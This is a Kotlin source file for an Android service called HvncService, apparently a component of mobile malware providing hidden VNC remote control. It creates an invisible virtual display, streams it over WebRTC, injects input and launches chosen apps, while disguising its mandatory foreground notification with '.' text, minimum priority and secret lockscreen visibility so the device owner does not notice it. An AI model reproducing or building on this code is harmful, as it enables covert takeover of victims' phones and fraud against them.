package com.fason.app.features.hvnc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.fason.app.R
import com.fason.app.core.Protocol

/**
 * Foreground service that owns the HVNC virtual display lifecycle.
 *
 * Manages HvncDisplayManager, HvncWebRtcManager, and HvncInputInjector.
 * Runs with FOREGROUND_SERVICE_TYPE_SPECIAL_USE to stay alive in background.
 *
 * Intent Actions:
 * - START: Create the virtual display and wire up WebRTC
 * - STOP:  Destroy everything and stop the service
 * - LAUNCH_APP: Launch an app on the virtual display
 * - RESIZE: Resize the virtual display
 */
class HvncService : Service() {

    companion object {
        const val ACTION_START = "HVNC_START"
        const val ACTION_STOP = "HVNC_STOP"
        const val ACTION_LAUNCH_APP = "HVNC_LAUNCH"
        const val ACTION_RESIZE = "HVNC_RESIZE"

        const val EXTRA_WIDTH = "width"
        const val EXTRA_HEIGHT = "height"
        const val EXTRA_DPI = "dpi"
        const val EXTRA_PACKAGE = "package"

        private const val NOTIFICATION_CHANNEL = "HvncChannel"
        private const val NOTIFICATION_ID = 1004
        private const val TAG = "HvncService"

        @Volatile
        var instance: HvncService? = null
            private set

        @JvmStatic
        fun isRunning(): Boolean = instance?.displayManager?.isActive() == true
    }

    private var displayManager: HvncDisplayManager? = null
    private var inputInjector: HvncInputInjector? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE,
                )
            } catch (e: SecurityException) {
                Log.w(TAG, "FGS type fallback", e)
                startForeground(NOTIFICATION_ID, createNotification())
            }
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
                startHvnc(width, height, dpi)
            }
            ACTION_STOP -> {
                stopHvnc()
                stopSelf()
            }
            ACTION_LAUNCH_APP -> {
                val pkg = intent.getStringExtra(EXTRA_PACKAGE) ?: return START_NOT_STICKY
                inputInjector?.launchApp(pkg)
            }
            ACTION_RESIZE -> {
                val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
                resizeDisplay(width, height, dpi)
            }
        }
        return START_NOT_STICKY
    }

    private fun startHvnc(width: Int, height: Int, dpi: Int) {
        if (displayManager?.isActive() == true) {
            Log.d(TAG, "HVNC already active, sending status")
            HvncWebRtcManager.emitCurrentStatus()
            return
        }

        val dm = HvncDisplayManager(this)
        val injector = HvncInputInjector(this)

        if (!dm.create(width, height, dpi)) {
            Log.e(TAG, "Failed to create virtual display")
            HvncWebRtcManager.emitCurrentStatus()
            stopSelf()
            return
        }

        injector.displayId = dm.displayId
        displayManager = dm
        inputInjector = injector

        // Attach to WebRTC manager for streaming
        HvncWebRtcManager.attach(dm, injector)
        HvncWebRtcManager.onDisplayReady()

        Log.d(TAG, "HVNC started: display=${dm.displayId} ${dm.displayWidth}x${dm.displayHeight}")
    }

    private fun resizeDisplay(width: Int, height: Int, dpi: Int) {
        val dm = displayManager ?: return
        if (dm.resize(width, height, dpi)) {
            inputInjector?.displayId = dm.displayId
            HvncWebRtcManager.attach(dm, inputInjector!!)
            HvncWebRtcManager.emitCurrentStatus()
            Log.d(TAG, "HVNC resized: ${dm.displayWidth}x${dm.displayHeight}")
        }
    }

    private fun stopHvnc() {
        HvncWebRtcManager.stopSession()
        displayManager?.destroy()
        displayManager = null
        inputInjector = null
        Log.d(TAG, "HVNC stopped")
    }

    override fun onDestroy() {
        stopHvnc()
        if (instance === this) instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Notification ──────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL,
                ".",
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                description = "."
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }
}
